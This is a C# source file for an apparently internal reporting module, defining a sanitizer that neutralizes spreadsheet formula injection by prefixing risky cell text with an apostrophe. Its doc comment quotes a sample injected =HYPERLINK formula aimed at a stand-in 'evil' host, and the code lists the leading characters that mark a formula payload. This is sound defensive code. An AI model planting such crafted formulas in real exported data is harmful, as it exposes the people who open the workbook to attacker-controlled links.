namespace PlantOps.Modules.Reporting.Export;

/// <summary>
/// Guards against formula injection ("CSV/Excel injection", OWASP). A text cell that starts with = + - or @ is read by
/// Excel as a formula, so a crafted name such as <c>=HYPERLINK("http://evil",...)</c> would run in a manager's workbook.
/// Tab and carriage return are included because Excel strips them before deciding whether a cell is a formula.
/// </summary>
internal static class SpreadsheetText
{
    private static readonly char[] Dangerous = ['=', '+', '-', '@', '\t', '\r'];

    /// <summary>The text to put in a string cell: unchanged when harmless, prefixed with an apostrophe when it could be a formula.</summary>
    public static string Safe(string? value)
    {
        if (string.IsNullOrEmpty(value))
        {
            return string.Empty;
        }

        return Array.IndexOf(Dangerous, value[0]) >= 0 ? "'" + value : value;
    }
}
